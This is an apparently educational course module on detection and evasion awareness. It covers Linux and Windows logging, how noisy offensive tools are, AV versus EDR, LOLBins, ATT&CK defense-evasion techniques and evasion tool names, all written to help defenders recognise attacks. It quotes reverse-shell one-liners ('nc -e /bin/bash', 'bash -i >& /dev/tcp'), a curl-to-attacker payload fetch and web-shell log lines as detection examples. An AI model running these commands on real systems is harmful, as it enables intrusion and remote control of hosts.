# Detection and evasion awareness

This module is unusual: it's written from the **attacker's perspective for the defender's benefit**. Every offensive action in Week 5 leaves a trail. Understanding that trail — and the difference between "noisy" and "loud" — is what separates a junior red-teamer from a competent one and a junior blue-teamer from a great one. The whole point of this module is so that the SOC analyst reading [incident-response-lite.md](incident-response-lite.md) next has a vocabulary for "what would I look for?"

We will not teach malware development. We will not provide AV-bypass payloads. We will discuss the techniques at the level needed to recognise them in detection rules, ATT&CK reports, and IR writeups.

> **Authorized targets only.** Everything below is conceptual or limited to your own lab. Building evasion tooling and pointing it at someone else's host is a felony under IT Act 2000 §43 (unauthorized access), §66 (computer-related offences), §66F (cyber-terrorism). The named tools (Veil, Donut, Sliver, ScareCrow, etc.) are mentioned at the concept level because you will hear them referenced in incident reports — they belong in a lab on your own machine and **never** in any uninvited engagement. CSOT does not run evasion exercises against IIT or any external infrastructure.

---

## The mental model

Defenders deploy a stack of controls. Attackers try to slip through each one. ATT&CK calls this Defense Evasion (TA0005) and catalogues 40+ techniques. The shape of the stack — broadly — is:

```
┌─────────────────────────────────────────────────────────┐
│  6. SIEM / SOC analyst                                  │  ← humans, correlation
│  ─────────────────────────────────────────────────────  │
│  5. EDR (CrowdStrike, SentinelOne, Defender for EP)     │  ← behavioural, kernel
│  ─────────────────────────────────────────────────────  │
│  4. AV (Defender, Symantec, Avast)                      │  ← file signatures, heuristics
│  ─────────────────────────────────────────────────────  │
│  3. Host telemetry (auditd, sysmon, eBPF)               │  ← raw events
│  ─────────────────────────────────────────────────────  │
│  2. Network (IDS/IPS, NetFlow, WAF, proxy logs)         │  ← packet/flow
│  ─────────────────────────────────────────────────────  │
│  1. App and OS logs (auth.log, web access, journald)    │  ← what software writes itself
└─────────────────────────────────────────────────────────┘
```

Each layer sees different things. A clever exploit might evade signature-based AV (layer 4) but still light up EDR (layer 5) because of the behaviour it performs. Evading *everything* requires evading every layer — usually impossible.

The honest message: **assume EDR sees what you do.** Modern offensive work in a real environment is less about "being invisible" and more about "operating at the noise floor for long enough to finish the engagement before anyone correlates the signals."

---

## What gets logged on Linux

Useful to know exactly. Each of these has an equivalent CSOT lab analogue.

### `auth.log` / `journalctl _COMM=...`

The single highest-signal Linux log:

```
May 27 11:23:01 box sshd[2412]: Accepted password for bob from 10.9.0.5 port 41023 ssh2
May 27 11:23:01 box sshd[2412]: pam_unix(sshd:session): session opened for user bob(uid=1001) by (uid=0)
May 27 11:24:13 box sudo:    bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/find /root
```

Three lines, an entire attack timeline. Anyone who's looked at one breach report has read these.

### `auditd`

If installed and configured, auditd logs every syscall matching its rules:

```
type=SYSCALL msg=audit(...): syscall=2 success=yes exit=3 a0=... uid=1001 euid=0 ...
type=PATH msg=audit(...): name="/etc/passwd" inode=... mode=0100644 ouid=0
```

Real-world auditd rules watch:

- `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` (any write)
- `/root/.ssh/authorized_keys`
- SUID/SGID bit changes
- `execve` of any binary outside `/usr/bin`, `/bin`
- `connect()` to external IPs from processes spawned by `apache`, `nginx`, `php-fpm`

These are exactly the techniques covered in [privilege-escalation.md](privilege-escalation.md) and [post-exploitation.md](post-exploitation.md). Auditd was designed assuming the attacker would do them.

### `/proc` and process telemetry

EDR agents on Linux (Falcon, S1, Carbon Black) watch `/proc` and `execve` syscalls via kernel modules or eBPF. They see:

- Process tree: which process spawned which
- Command-line arguments of every `exec`
- Network connections (`connect()` syscalls) per process
- File reads of "sensitive" paths (configurable)

The classic detection signature is **anomalous parent-child relationships**. A web server (`php-fpm`, `nginx`) spawning `bash` is almost never benign. The signature `php-fpm → sh → curl http://attacker/payload` is the most common web-shell behavioural rule in existence.

### Web server access logs

```
10.0.0.1 - - [27/May/2026:11:23:01 +0530] "GET /uploads/.health.php?c=id HTTP/1.1" 200 47 "-" "curl/8.4"
```

A `.php` file with a query string of `c=` (command) and a `curl/8.4` UA is approximately a write-up of "web shell in use." Web-shell hunting in access logs is half of SOC work in app-heavy environments.

---

## What gets logged on Windows

A briefer survey because most CSOT labs are Linux:

| Source | What it captures |
|--------|------------------|
| **Security event log** (4624, 4625, 4672, 4688) | Logons (success/fail), special privilege use, process creation |
| **PowerShell logging** (4103/4104) | Every PowerShell command + scriptblock |
| **Sysmon** | Detailed process tree, DNS, file create, network connect, named-pipe events |
| **AMSI** | In-memory script content seen by AV/EDR — even fileless payloads pass through this hook |
| **ETW providers** | Kernel-level telemetry (registry, process, network) feeding EDR |
| **WDAC / AppLocker** | Allow-list enforcement; logs block events |

Sysmon + PowerShell ScriptBlock logging are the two things every modern Windows IR investigation reads first. If you've heard "we have Sysmon," it means every process is tracked with hashes and command lines.

---

## Noise level of the tools you used this week

Honest numbers — what each tool looks like from the defender's seat.

| Tool / activity | Default noise level | What defender sees |
|-----------------|---------------------|---------------------|
| `nmap` default scan | Very loud | IDS rules fire on SYN-without-ACK pattern; firewall logs full of half-open connections |
| `nmap -T0` | Quiet but slow | Probes spaced ~5 min apart — hard to distinguish from normal traffic in volume, easy to spot in pattern |
| `gobuster` / `ffuf` | Very loud | Hundreds of 404s per second; web log volume spikes; WAFs typically rate-limit at this level |
| `hydra` / brute-force | Extremely loud | Account lockouts, auth.log floods |
| Default `msfvenom` payload | Detected immediately | Every mainstream AV signatures default Metasploit payloads |
| Meterpreter on disk | Detected immediately | EDR fires on the stager loading reflectively |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Loud on EDR-enabled boxes | Anomalous: web user spawning Python spawning bash |
| `linpeas.sh` | Very loud | File reads across `/`, `find` invocations on SUID, capability checks — auditd will catch the pattern |
| `pspy` | Quiet | Reads `/proc` only; benign-looking — but the binary itself is on disk |
| `chisel` / reverse SSH tunnel | Loud on networks with proper egress monitoring | Long-lived outbound TCP to non-corporate ASN |
| Manual one-liner reverse shell (`bash -i >& /dev/tcp/.../...`) | Loud on EDR | `bash` opening a TCP socket is in every rule book |
| Writing new SUID binary | Loud | `auditd` watches; file integrity DB delta |
| Modifying `/etc/passwd` | Extremely loud | First-page incident |
| Tampering with logs | Extremely loud | Centralised logging means tampering creates *more* alerts, not fewer |

The takeaway: **default tooling is noisy on purpose**. The tools optimise for capability and reliability, not stealth. The "evasion" branch of offensive work is its own discipline; the rest of us are loud on purpose and rely on engagement timing to finish before correlation catches up.

---

## How AV works (briefly)

| Detection approach | What it does | What defeats it (in principle) |
|--------------------|--------------|--------------------------------|
| **Signature** | Pattern match against known-bad byte sequences | XOR-encoding the payload, packing |
| **Heuristic** | Look for suspicious *constructs* (large XOR blobs, suspicious imports, packed sections) | Avoid the constructs |
| **Behavioural** | Monitor what the process does at runtime — does it inject into others, hook syscalls, etc. | Don't do the suspicious behaviour |
| **Reputation / cloud** | Submit hashes to the vendor's cloud; rare or new files are flagged | The first-of-its-kind file is the worst case for AV reputation |

AV alone is largely an artifact of the 2010s. Modern environments combine AV (signature) + EDR (behavioural + cloud reputation + telemetry collection). The bypass surface is much smaller than people assume.

### AV vs EDR

| | AV | EDR |
|-|----|-----|
| Goal | Block known-bad files | Observe + respond to suspicious behaviour |
| Scope | Files on disk + a few process hooks | Every process, file, registry, network event |
| Network requirement | Often offline | Sends telemetry to cloud constantly |
| Bypass approach | Encode/encrypt the on-disk artefact | Operate in memory + mimic benign behaviour |
| Real-world strength | Mostly catches the 99% of unmodified commodity malware | Catches behaviour that AV misses; correlates across hosts |

If a target has EDR (CrowdStrike Falcon, SentinelOne, Microsoft Defender for Endpoint, Carbon Black), assume:

1. **Your process is observed in detail** the moment it starts.
2. **LSASS access, reflective load, named-pipe IPC, and "uncommon parent → child"** trees light up immediately.
3. **The cloud has your file's hash within seconds.**
4. **"Evasion" is largely a delay**, not an erasure.

This is why mature red-teamers say things like "EDR makes you write better code, not invisible code."

---

## Obfuscation and encoding — what each does (and doesn't)

| Technique | What it changes | What it doesn't change |
|-----------|------------------|------------------------|
| **Base64 / hex encoding** | Static signature of payload bytes | Behaviour at runtime; AMSI sees the decoded form |
| **XOR with a static key** | Static signature | Same as above |
| **Packing** (UPX, ConfuserEx, etc.) | The on-disk bytes; many packers themselves are signatured | Behaviour at runtime |
| **Polymorphic encoders** (`shikata_ga_nai`) | Each generation looks different | Modern AV signatures the *decoder stub*; well-known |
| **Source-level obfuscation** | Static analysis difficulty | Behaviour; what the program does is unchanged |
| **In-memory execution** (reflective DLL, process hollowing) | On-disk artefact (there is none) | Behaviour visible to EDR; AMSI sees the script |
| **Living off the land** (LOLBins) | Custom binaries on disk | Process tree; many LOLBins are already in EDR detection rules |

A useful heuristic: **the more dangerous the action, the better-instrumented it is**. Bypassing AV's static scan for a "Hello World" payload is trivial. Bypassing EDR's behavioural detection for "dump LSASS and pivot via SMB" is months of research and burns the moment it's published.

### LOLBins — Living Off the Land Binaries

Many real attacks use only built-in OS binaries. No custom payload to detect:

| Linux | Windows |
|-------|---------|
| `bash`, `curl`, `wget`, `python`, `perl` | `powershell`, `cmd`, `mshta`, `rundll32`, `regsvr32` |
| `nc`, `socat`, `ssh` | `bitsadmin`, `certutil`, `installutil` |
| `find`, `awk`, `xxd` (decode + execute) | `wmic`, `wsl`, `forfiles` |
| `git`, `pip`, `gem` (install-time hooks) | `msbuild`, `dotnet`, `regsvcs` |

The [LOLBAS project](https://lolbas-project.github.io/) catalogues Windows; [GTFOBins](https://gtfobins.github.io/) catalogues Unix. Detection engineers use these catalogues to write rules for "what does normal use of this binary look like, and what doesn't?"

A representative detection rule: *"PowerShell launched by Word/Excel/Outlook with `-EncodedCommand` argument."* That tiny rule blocks an entire class of macro-borne attacks without caring about the payload.

---

## Tools and frameworks you'll hear named

Mentioned at concept level only. **All of these are dual-use software — possessing them is fine; running them outside a lab is not.**

| Tool | What it does | Why it gets mentioned |
|------|--------------|------------------------|
| **Veil** (Python) | Encode/encrypt Metasploit payloads to bypass static AV | Historical; modern AV catches most of its outputs |
| **Donut** | Convert .NET/PE/dll into position-independent shellcode for in-memory loading | Building block for modern C2 stagers |
| **Sliver** | Open-source C2 framework written in Go (Bishop Fox) | Increasingly seen in IR reports as the Cobalt Strike alternative |
| **Mythic** | C2 framework with modular agents and operator UI | Research and red-team use |
| **Empire / Starkiller** | PowerShell/Python C2 (deprecated, then revived) | Still seen in commodity attacks |
| **Cobalt Strike** | Commercial C2 — the de facto standard for both red teams and threat actors | Detection rules industry-wide are tuned to Cobalt Strike beacons |
| **ScareCrow / Inceptor / Sgn-Pe-X** | Loaders that wrap shellcode with EDR-evasion tricks | Cat-and-mouse; what works this quarter is signatured next |
| **AMSI bypasses** | Patch the AMSI function pointer in memory so script content isn't seen | Published bypasses get signatured within weeks |

Why list them? Because every Mandiant / CrowdStrike / Microsoft IR report cites these by name. If you're reading "the threat actor used Sliver beacons with chained encrypted DNS C2," you should know what *kind* of artefact that is.

---

## "I evaded AV" — what that usually means

Common claims and their honest interpretation:

| Claim | Reality |
|-------|---------|
| "It didn't get flagged by Windows Defender on my VM" | Your VM doesn't have cloud reputation enabled; the file would be flagged within 24h of upload. |
| "VirusTotal score is 0/72" | VirusTotal shares samples with vendors; your "clean" sample will be detected within days. Don't upload your real payloads to VT. |
| "AMSI didn't catch it" | AMSI is one of seven layers; ETW and EDR likely did. |
| "Defender for Endpoint passed it" | Quite possibly true if signatures haven't caught up; cloud analytics likely flagged it within hours; the EDR session is now under investigation. |
| "My shellcode loader is fully undetectable" | At the static layer. Behavioural detection of "process unexpectedly allocating RWX memory and jumping to it" is decades old. |

Modern evasion is a moving target measured in weeks. A bypass posted on Twitter today is signatured by next month. This is *the reason* defender-in-depth works — you don't need every layer to catch you, just one.

---

## ATT&CK Defense Evasion — the high-value sub-techniques

Skim these because IR reports will cite them by number:

| ID | Technique | Plain English |
|----|-----------|----------------|
| T1027 | Obfuscated Files or Information | Anything packed/encoded |
| T1070 | Indicator Removal | Wiping logs, deleting files |
| T1070.003 | Clear Command History | `history -c`, `unset HISTFILE` |
| T1112 | Modify Registry | Persistence via reg, or anti-AV reg changes |
| T1140 | Deobfuscate / Decode Files or Information | Stage 1 → stage 2 decode |
| T1218 | System Binary Proxy Execution | LOLBins on Windows |
| T1222 | File and Directory Permissions Modification | `chmod`, `chown` |
| T1497 | Virtualization / Sandbox Evasion | "Don't run if you're in a sandbox" checks |
| T1562 | Impair Defenses | Disable AV, stop auditd, drop syslog forwarding |
| T1620 | Reflective Code Loading | In-memory PE/DLL loading |

If you ever read a report citing "T1027.002" — that's a specific sub-technique you can look up. The matrix is a shared vocabulary for "what did the attacker actually do?"

---

## Detection note — the things that almost always get caught

If you remember nothing else from this module, remember these:

1. **`nc -e /bin/bash <attacker>`** — every IDS, every EDR, every behavioural rule.
2. **`bash -i >& /dev/tcp/...`** — same.
3. **Default msfvenom payloads on disk** — caught.
4. **PowerShell with `-EncodedCommand`** — every Windows rulebook.
5. **LSASS handle from non-system process** — Defender-for-Endpoint default alert.
6. **`whoami; id; hostname; ipconfig`** in quick succession — "discovery burst" rule.
7. **Outbound SMB to internet** — strong tunneling signal.
8. **`/etc/passwd` modified by non-root** — file integrity catches it.
9. **New process named `svchost.exe` outside `C:\Windows\System32\`** — Sysmon.
10. **Web user spawning `bash` / `cmd`** — web-shell behavioural signature.

These are the rules that catch 90% of unsophisticated activity. A well-funded defender has hundreds more.

---

## CTF tip — the CTF is *not* the same as real life

The CTF box doesn't have EDR. It probably doesn't have auditd configured. It almost certainly doesn't run Sysmon. You can be as noisy as you want inside the lab — `linpeas` away, default Meterpreter sessions, `nc` reverse shells, the works.

But pay attention to what each technique *would* look like in a logged environment. Build the habit of asking "what would this leave?" while you're learning, because the engagement skills you build now compound forever, and the difference between "junior red-teamer who got popped" and "senior operator" is exactly that habit.

---

## The blue-team takeaway

Detection engineering is the inverse of every section above. For each technique attackers use, you write a detection. The signal looks like:

```
1. attacker action  → 2. log/telemetry source  → 3. detection rule  → 4. SOC alert
```

The job of a detection engineer is finding the noisy actions in (1) that produce a reliable signal in (2) that you can rule on in (3) without overwhelming the SOC in (4). The art is **fidelity**: an alert that fires only when something is genuinely bad is worth ten that mostly fire on benign behaviour.

Every module in this week has a counterpart detection. The next module ([incident-response-lite.md](incident-response-lite.md)) takes the analyst's seat and walks through what the actual investigation looks like.

---

## Further reading

- [MITRE ATT&CK — Defense Evasion (TA0005)](https://attack.mitre.org/tactics/TA0005/) — the matrix entry; click through the techniques.
- [LOLBAS](https://lolbas-project.github.io/) — Living off the land binaries on Windows.
- [GTFOBins](https://gtfobins.github.io/) — same for Unix.
- [The DFIR Report](https://thedfirreport.com/) — public IR writeups with ATT&CK mapping; read 2-3.
- [Red Canary — annual Threat Detection Report](https://redcanary.com/threat-detection-report/) — what gets detected in practice.
- [Atomic Red Team](https://atomicredteam.io/) — tiny safe-to-run ATT&CK procedure tests for your own lab.
- [Sigma rules](https://github.com/SigmaHQ/sigma) — open detection rules library; reading them is excellent training.
- [Awesome Threat Detection](https://github.com/0x4D31/awesome-threat-detection) — curated link list.

---

## Next module

[incident-response-lite.md](incident-response-lite.md) — Now the blue-team seat. The next module walks through the IR lifecycle — what a junior responder actually does when one of the alerts above fires.
